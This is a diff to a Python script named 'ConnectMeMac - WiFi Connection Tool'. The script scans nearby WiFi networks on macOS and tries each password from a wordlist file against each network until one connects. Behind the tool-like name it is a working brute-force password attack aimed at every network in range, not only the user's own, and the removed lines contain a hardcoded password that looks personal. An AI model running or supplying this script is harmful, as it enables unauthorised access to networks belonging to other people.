@@ -5,6 +5,10 @@ import os
 import signal
 import re
 
+# ConnectMeMac - WiFi Connection Tool
+# Copyright (c) 2024 by Amir Othman
+# This script is licensed under the MIT License.
+
 def get_wifi_ssids():
     ssids = []
     airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
@@ -16,7 +20,6 @@ def get_wifi_ssids():
             ssid = ssid_match.group(0)
             ssids.append(ssid)
     return ssids
-
 
 def get_current_ssid():
     airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
@@ -36,10 +39,10 @@ def connect_wifi(ssid, password):
     else:
         return False
 
-
-
-def try_multiple_passwords_on_all_networks(passwords):
+def try_multiple_passwords_on_all_networks(password_file):
     ssids = get_wifi_ssids()
+    with open(password_file, "r") as file:
+        passwords = file.read().splitlines()
     for ssid in ssids:
         for password in passwords:
             print(f"Trying to connect to {ssid} with password '{password}' 🧟")
@@ -48,9 +51,7 @@ def try_multiple_passwords_on_all_networks(passwords):
                 sys.exit(0)
             else:
                 print(f"Failed to connect to {ssid} with password '{password}' ❌")
-                pass
             time.sleep(3)
 
 if __name__ == '__main__':
-    passwords = ["password1", "Amir2001@", "password3"]
-    try_multiple_passwords_on_all_networks(passwords)
+    try_multiple_passwords_on_all_networks("passwords.txt")
